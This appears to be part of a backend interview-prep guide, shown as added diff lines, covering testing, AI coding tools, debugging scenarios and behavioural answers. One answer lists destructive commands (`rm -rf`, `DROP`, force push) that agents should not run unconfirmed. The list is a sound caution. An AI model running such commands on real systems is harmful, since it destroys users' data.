+|---|---|---|---|
+| Unit | One function/class, dependencies faked | ms | `calculateDiscount()` returns 10% for gold users |
+| Integration | Several parts together with real DB/Redis | seconds | `POST /orders` creates rows in Postgres |
+| End-to-end | Whole system through the UI | minutes | User logs in, adds to cart, pays |
+| Contract | API shape agreed between consumer and provider | fast | Pact tests between web app and order API |
+| Load | Performance under traffic | minutes | 1,000 req/s for 10 min with p95 < 300 ms |
+
+### Q3. Write a unit test with mocks.
+**Answer & Example (Vitest):**
+```ts
+import { describe, it, expect, vi } from 'vitest';
+import { OrderService } from './order.service';
+
+describe('OrderService.cancel', () => {
+  const repo = { findById: vi.fn(), updateStatus: vi.fn() };
+  const service = new OrderService(repo as any);
+
+  it('cancels a pending order owned by the user', async () => {
+    repo.findById.mockResolvedValue({ id: '1', userId: 'u1', status: 'pending' });
+    repo.updateStatus.mockResolvedValue({ id: '1', status: 'cancelled' });
+
+    const result = await service.cancel('1', { id: 'u1', role: 'user' });
+
+    expect(result.status).toBe('cancelled');
+    expect(repo.updateStatus).toHaveBeenCalledWith('1', 'cancelled');
+  });
+
+  it('rejects cancelling a shipped order with 409', async () => {
+    repo.findById.mockResolvedValue({ id: '1', userId: 'u1', status: 'shipped' });
+    await expect(service.cancel('1', { id: 'u1', role: 'user' }))
+      .rejects.toMatchObject({ status: 409 });
+  });
+
+  it('forbids cancelling another user\'s order', async () => {
+    repo.findById.mockResolvedValue({ id: '1', userId: 'u2', status: 'pending' });
+    await expect(service.cancel('1', { id: 'u1', role: 'user' }))
+      .rejects.toMatchObject({ status: 403 });
+  });
+});
+```
+
+### Q4. Write an API integration test.
+**Answer & Example (Supertest + real test DB):**
+```ts
+import request from 'supertest';
+import { app } from '../src/app';
+import { db, resetDb, seedUser, tokenFor } from './helpers';
+
+beforeEach(async () => { await resetDb(); });
+
+describe('POST /v1/orders', () => {
+  it('returns 401 without a token', async () => {
+    await request(app).post('/v1/orders').send({}).expect(401);
+  });
+
+  it('returns 400 for invalid body', async () => {
+    const user = await seedUser();
+    const res = await request(app)
+      .post('/v1/orders')
+      .set('Authorization', `Bearer ${tokenFor(user)}`)
+      .send({ items: [] })
+      .expect(400);
+    expect(res.body.error.code).toBe('VALIDATION_ERROR');
+  });
+
+  it('creates an order and reduces stock', async () => {
+    const user = await seedUser();
+    await db.query("INSERT INTO products (id, name, price, stock) VALUES (1, 'Pen', 20, 10)");
+
+    const res = await request(app)
+      .post('/v1/orders')
+      .set('Authorization', `Bearer ${tokenFor(user)}`)
+      .send({ items: [{ productId: 1, qty: 2 }] })
+      .expect(201);
+
+    expect(res.body.total).toBe(40);
+    const { rows } = await db.query('SELECT stock FROM products WHERE id = 1');
+    expect(rows[0].stock).toBe(8);
+  });
+});
+```
+
+### Q5. Mocks vs stubs vs fakes vs spies?
+**Answer:**
+- **Stub**: returns canned answers (`getUser` always returns user 42).
+- **Mock**: a stub that also verifies how it was called (`expect(mailer.send).toHaveBeenCalledWith(...)`).
+- **Fake**: a working lightweight implementation (in-memory repository).
+- **Spy**: wraps a real function and records calls.
+
+Mock external systems you don't control (payment provider, email, SMS). In integration tests, use a **real** database (Docker/Testcontainers) — mocking your own DB hides real bugs.
+
+### Q6. How do you test code that depends on time or randomness?
+**Answer:** Inject a clock or use fake timers; seed random generators or inject an id generator.
+
+**Example:**
+```ts
+vi.useFakeTimers();
+vi.setSystemTime(new Date('2026-10-07T10:00:00Z'));
+expect(isOfferActive(offer)).toBe(true);
+vi.advanceTimersByTime(24 * 60 * 60 * 1000);
+expect(isOfferActive(offer)).toBe(false);
+vi.useRealTimers();
+```
+
+### Q7. What makes tests flaky and how do you fix them?
+**Answer:** Causes: shared state between tests, dependence on test order, real time/timezones, network calls to real services, race conditions, arbitrary `sleep`s. Fixes: isolate data per test, reset DB, fake time, mock external services, wait for conditions rather than fixed delays, run tests in random order to expose dependencies.
+
+### Q8. What is TDD?
+**Answer:** **Test-Driven Development**: write a failing test (**red**), write the minimum code to pass (**green**), then clean up (**refactor**). Leads to testable design and good coverage. Useful especially for business rules and bug fixes (write a test reproducing the bug first).
+
+### Q9. How do you write table-driven tests in Go?
+**Answer & Example:**
+```go
+func TestDiscount(t *testing.T) {
+    tests := []struct {
+        name  string
+        tier  string
+        total float64
+        want  float64
+    }{
+        {"no discount for regular", "regular", 1000, 0},
+        {"10% for gold", "gold", 1000, 100},
+        {"capped at 500", "gold", 10000, 500},
+    }
+    for _, tt := range tests {
+        t.Run(tt.name, func(t *testing.T) {
+            got := Discount(tt.tier, tt.total)
+            if got != tt.want {
+                t.Errorf("Discount(%q, %v) = %v, want %v", tt.tier, tt.total, got, tt.want)
+            }
+        })
+    }
+}
+// go test ./... -race -cover
+```
+
+### Q10. How do you load test an endpoint?
+**Answer:** Define goals (e.g. 500 req/s with p95 < 300 ms and < 1% errors), run a tool like **k6** against a production-like environment, watch application and DB metrics during the test, find the bottleneck, fix, repeat.
+
+**Example (k6):**
+```js
+import http from 'k6/http';
+import { check } from 'k6';
+
+export const options = {
+  stages: [{ duration: '2m', target: 200 }, { duration: '5m', target: 200 }, { duration: '1m', target: 0 }],
+  thresholds: { http_req_duration: ['p(95)<300'], http_req_failed: ['rate<0.01'] },
+};
+
+export default function () {
+  const res = http.get('https://staging.shop.com/v1/products?limit=20');
+  check(res, { 'status 200': (r) => r.status === 200 });
+}
+```
+
+### Q11. What is code coverage and is 100% the goal?
+**Answer:** Coverage measures which lines/branches tests execute. It shows **untested** code, but high coverage doesn't prove tests are good (they may assert nothing). Aim for strong coverage of business logic (often 70–80%), and focus on meaningful assertions and edge cases rather than a number.
+
+---
+
+## 20. AI-Assisted Development
+
+### Q1. Which AI coding tools have you used and how do they differ?
+**Answer:**
+| Tool | Style | Typical use |
+|---|---|---|
+| GitHub Copilot | Inline autocomplete + chat + agent mode in the IDE | Fast suggestions while typing, PR reviews on GitHub |
+| Cursor / Windsurf | AI-first editors with codebase-wide context | Multi-file edits, "apply this change across the project" |
+| Claude Code | Agent in the terminal/IDE | Reads the repo, plans, edits files, runs tests and commands, iterates |
+| OpenAI Codex | Cloud/CLI coding agent | Delegated tasks running in parallel, PR generation |
+
+Explain which you use, for what, and why — interviewers want specifics.
+
+### Q2. How do you use AI tools in your daily workflow?
+**Answer (sample):** "I use them across the lifecycle: scaffolding endpoints and DTOs from an existing pattern, writing SQL and checking query plans, generating test cases including edge cases, explaining unfamiliar code, refactoring (callbacks to async/await, JS to TS), drafting OpenAPI docs and READMEs, and a first-pass code review. I treat the output like a junior colleague's PR: I review every diff, run tests and type checks, and never merge code I can't explain."
+
+### Q3. How do you write a good prompt for a coding task?
+**Answer:** Give **goal, context, constraints, examples and acceptance criteria**, and ask for a plan before code for anything non-trivial.
+
+**Example:**
+```
+Task: Add PATCH /v1/orders/:id/cancel in src/modules/orders.
+Context: Follow the structure of order.controller.ts / order.service.ts. We use Express 5,
+Zod for validation, pg with withTransaction() from src/lib/db.ts, AppError for errors.
+Rules:
+- Only the owner or an admin can cancel (403 otherwise).
+- Only orders with status 'pending' can be cancelled (409 otherwise).
+- Restore product stock for every order item in the same transaction.
+- Publish an OrderCancelled row to the outbox table.
+Tests: Supertest integration tests for 200, 403, 404, 409 and stock restoration.
+First show me a short plan and the files you will touch. Don't modify migrations.
+```
+
+### Q4. How do you give the AI tool enough context?
+**Answer:** Point it to the relevant files, schema and an existing example to copy; keep a project instruction file (`CLAUDE.md`, `.cursorrules`, `.github/copilot-instructions.md`) with conventions, commands and do's/don'ts; connect tools via **MCP** (database schema, issue tracker, docs) when available; and work in small, focused tasks so the context window stays relevant.
+
+**Example (`CLAUDE.md`):**
+```markdown
+# Project conventions
+- Stack: Node 22, TypeScript strict, Express 5, PostgreSQL 16, Redis, Vitest.
+- Commands: `npm run dev`, `npm test`, `npm run lint`, `npm run typecheck`, `npm run migrate`.
+- Structure: src/modules/<feature>/{routes,controller,service,repository,schema}.ts
+- Always validate input with Zod; throw AppError; never return raw DB rows.
+- Use parameterised SQL only. Every new endpoint needs integration tests.
+- Never edit existing migrations; create a new one.
+```
+
+### Q5. How do you verify AI-generated code?
+**Answer:**
+1. **Read and understand every line** — if I can't explain it, I don't merge it.
+2. **Run** type-check, lint, unit and integration tests; add tests for new behaviour and edge cases.
+3. Check tests actually fail when the code is wrong (AI-written tests may share the code's mistake).
+4. Review **security**: authz checks, input validation, SQL injection, secrets, error leakage.
+5. Review **performance**: N+1 queries, missing indexes, unbounded loops/memory.
+6. Verify any library or API it used really exists and is current (check docs/registry).
+7. Code review by a teammate and CI gates (SAST like Semgrep/CodeQL, dependency scanning).
+
+### Q6. What are the risks of AI-generated code?
+**Answer:**
+- **Hallucinations**: invented functions, options, packages.
+- **Package hallucination / "slopsquatting"**: attackers publish malicious packages with names AI tools tend to invent.
+- **Security flaws**: missing authorization, string-built SQL, weak crypto, hardcoded secrets.
+- **Subtle logic bugs** that look plausible.
+- **Outdated patterns** from older training data.
+- **Licensing** concerns for copied code.
+- **Data leakage**: pasting secrets, customer data or proprietary code into unapproved tools.
+- **Over-reliance**: shallow understanding of your own codebase.
+
+### Q7. Tell me about a time an AI tool gave you wrong code. (Sample STAR answer)
+**Answer:** "**Situation**: I asked an agent to add pagination to an orders endpoint. **Task**: it had to handle 2M rows. **Action**: it produced `OFFSET` pagination and tests that passed on 10 seeded rows. In review I ran `EXPLAIN ANALYZE` on a production-size copy: deep pages took over 2 seconds. I asked it to switch to keyset pagination on `(created_at, id)`, added a composite index migration, and wrote a test for ties on `created_at`. **Result**: p95 dropped to under 20 ms, and I added a note to our `CLAUDE.md` to prefer keyset pagination for large tables."
+
+### Q8. What would you never let an AI tool do unreviewed?
+**Answer:** Change authentication/authorization logic, payment or financial calculations, database migrations on production, infrastructure/IAM permissions, deletion of data, security-related config, or add new dependencies — and never let it run destructive commands (`rm -rf`, `DROP`, force push) without confirmation. Agents should run with least-privilege permissions in a sandbox or dev environment.
+
+### Q9. How can AI help with debugging?
+**Answer:** Give it the error message, stack trace, relevant code, recent changes and what you've already tried; ask for ranked hypotheses and how to confirm each; let an agent add logging or a failing test that reproduces the bug; then verify the root cause yourself before accepting the fix.
+
+**Example prompt:**
+```
+Error: "duplicate key value violates unique constraint orders_idempotency_key_key"
+appears ~20 times/day in production on POST /v1/orders since yesterday's deploy.
+Here is the handler, the service, and the diff of yesterday's PR.
+List the 3 most likely causes, how to confirm each from logs, and a failing test that reproduces it.
+```
+
+### Q10. How do you use AI for testing, documentation and code review?
+**Answer:**
+- **Testing**: "List edge cases for this function", generate table-driven tests, generate test data/fixtures, write Supertest tests from an OpenAPI spec.
+- **Documentation**: generate OpenAPI from routes, READMEs, architecture decision records, onboarding docs, commit messages and PR descriptions.
+- **Code review**: ask for a review focused on security, error handling and performance; use Copilot/Claude review bots on PRs — but a human approves.
+
+### Q11. What is an AI agent vs autocomplete? What is MCP?
+**Answer:** **Autocomplete** suggests the next lines as you type. An **agent** takes a goal, makes a plan, reads files, edits multiple files, runs commands/tests, reads the results and iterates until done. **MCP (Model Context Protocol)** is an open standard for connecting AI tools to external systems (databases, GitHub, Jira, docs, browsers) so the agent can use real context and tools.
+
+---
+
+## 21. Debugging Scenarios
+
+### Q1. An API endpoint suddenly became slow. How do you debug it?
+**Answer:**
+1. **Scope**: one endpoint or all? Since when? Correlate with deploys, traffic or data growth.
+2. **Metrics**: latency percentiles, error rate, CPU/memory, event-loop lag, DB connections, cache hit rate.
+3. **Traces**: find which span is slow — DB query, external API, or app code.
+4. **DB**: `pg_stat_statements`, `EXPLAIN ANALYZE`, locks (`pg_stat_activity`), missing index, N+1.
+5. **External calls**: timeouts, provider status, retries piling up.
+6. **App**: CPU-heavy code blocking the event loop, memory leak causing GC pauses, pool exhaustion.
+7. Fix, verify with metrics, add a test/alert so it doesn't recur.
+
+### Q2. Users report intermittent 502/504 errors. What could cause it?
+**Answer:** 502: the upstream app crashed/restarted (OOMKilled, unhandled exception), closed connections early (keep-alive timeout lower than the load balancer's), or returned an invalid response. 504: upstream too slow — slow queries, exhausted DB pool, slow third-party call without timeout. Check load balancer logs, pod restarts (`kubectl describe`), app logs by request id, and latency traces.
+
+**Example fix for a common Node + ALB issue:**
+```ts
+const server = app.listen(3000);
+server.keepAliveTimeout = 65_000;  // longer than ALB idle timeout (60 s)
+server.headersTimeout = 66_000;
+```
+
+### Q3. The database CPU is at 100%. What do you do?
+**Answer:** Immediately: identify top queries (`pg_stat_statements` by total time), kill runaway queries if needed, check for a new deploy or traffic spike. Then: add missing indexes, fix N+1 queries, add caching for hot reads, move reporting queries to a read replica, rate-limit abusive clients, and scale up as a temporary measure.
+
+```sql
+SELECT query, calls, total_exec_time, mean_exec_time
+FROM pg_stat_statements
+ORDER BY total_exec_time DESC
+LIMIT 10;
+```
+
+### Q4. Memory keeps growing until the container is OOMKilled. How do you investigate?
+**Answer:** Confirm with memory metrics (steady growth = leak; spikes = large payloads). Take heap snapshots at intervals (`node --inspect`, `--heapsnapshot-signal`) and compare what's growing. Common culprits: unbounded in-memory caches/maps, listeners never removed, large arrays from unpaginated queries, buffering whole files instead of streaming. Fix the cause; set sensible memory limits and alerts.
+
+### Q5. A customer was charged twice. How do you investigate and prevent it?
+**Answer:** Investigate: search logs by order/payment id, check if the client retried after a timeout, if a webhook was processed twice, or if two workers picked the same job. Prevent: **idempotency keys** on payment creation, unique constraints (`UNIQUE(order_id)` on payments), deduplicating webhook events by event id, idempotent consumers, and reconciliation jobs comparing your records with the provider's.
+
+### Q6. Data in the cache is stale after an update. Why?
+**Answer:** The cache key wasn't invalidated (missing `DEL` in one update path), invalidation happened **before** the DB commit (another request re-cached the old value), a different key format was used, or replicas lag behind the primary when refilling the cache. Fix: delete after commit, centralise cache key builders, use TTLs as a safety net, and consider event-based invalidation.
+
+### Q7. A deploy broke production. What do you do?
+**Answer:** **Mitigate first**: roll back (or disable the feature flag) — don't debug in production while users suffer. Communicate status. Then find root cause using logs/metrics/traces and the diff, add a test that would have caught it, and write a blameless postmortem with action items (better tests, canary deploys, alerts).
+
+---
+
+## 22. Behavioural Questions
+
+> Use **STAR**: **S**ituation, **T**ask, **A**ction (what *you* did), **R**esult (with numbers if possible).
+
+### Q1. Tell me about a backend feature you built end to end.
+**Sample answer:** "**S**: Our operations team tracked project updates manually in spreadsheets. **T**: I had to build an API to update project statuses in bulk. **A**: I designed the endpoints, validated input with a schema, used MongoDB `bulkWrite` for efficient updates, added role checks so only managers could update their region, wrote integration tests, and documented the API. **R**: Updates that took an hour of manual work now take a minute, with an audit trail."
+
+### Q2. Describe a difficult bug you fixed.
+**Sample answer:** "**S**: A webhook integration occasionally created duplicate records. **T**: Find and fix the cause. **A**: Logs showed the provider retried when our response took over 5 seconds. I made the handler verify the signature, store the event id with a unique constraint, return 200 immediately and process the event in a background job. **R**: Duplicates dropped to zero, and the endpoint's response time went from ~5 s to ~50 ms."
+
+### Q3. Tell me about a time you disagreed with a teammate.
+**Tips:** Show you listened, used data or a small experiment to decide, and committed to the outcome. Avoid blaming.
+
+### Q4. How do you learn a new technology quickly?
+**Sample answer:** "I read the official getting-started guide, build a small working example, then apply it to a real task. I use AI tools to explain concepts and compare approaches, but I verify against official docs. For example, I learned Go basics by rewriting one of our Node endpoints in Go and comparing the code and performance."
+
+### Q5. Why do you want this role?
+**Tips:** Connect your experience (backend APIs, databases, AI-assisted development) to the job's responsibilities, mention what you want to learn (system design at scale, cloud, observability), and show interest in the company's product.
+
+### Q6. Where do you see yourself in a few years?
+**Tips:** Growing into a strong backend/full-stack engineer who designs systems, mentors others and owns services in production — show ambition aligned with the role.
+
+---
+
+## Final Revision Checklist
+
+- [ ] Explain the Node event loop and predict output order
+- [ ] Write async code in parallel with proper error handling
+- [ ] Explain goroutines, channels, context and race conditions in Go
+- [ ] Choose correct HTTP methods and status codes; explain idempotency
+- [ ] Design REST URLs, pagination, versioning and error format
+- [ ] Explain JWT access/refresh, OAuth 2.0 + PKCE, OIDC, RBAC, IDOR
+- [ ] Structure a layered backend with central error handling and logging
+- [ ] Write joins, GROUP BY/HAVING and window-function queries
+- [ ] Explain indexes, composite index order, ACID, isolation levels and locking
+- [ ] Read an `EXPLAIN ANALYZE` plan and fix N+1 queries
+- [ ] Model data in MongoDB (embed vs reference) and use aggregation
+- [ ] Implement cache-aside with Redis; explain invalidation, stampede, rate limiting
+- [ ] Build a React page with hooks, data fetching and protected routes
+- [ ] Walk through a system design using the 7-step framework
+- [ ] Explain queues, Kafka vs RabbitMQ, outbox, saga, WebSockets vs SSE, serverless
+- [ ] Write a multi-stage Dockerfile, Compose file and CI workflow
+- [ ] Explain Kubernetes objects, probes and debugging commands
+- [ ] Name the OWASP API Top 10 and defences
+- [ ] Explain logs vs metrics vs traces, PromQL basics, OpenTelemetry, SLOs
+- [ ] Write unit and integration tests; explain mocks and flaky tests
+- [ ] Describe your AI-assisted workflow and 2–3 real stories of verifying AI output
+- [ ] Prepare 5 STAR stories
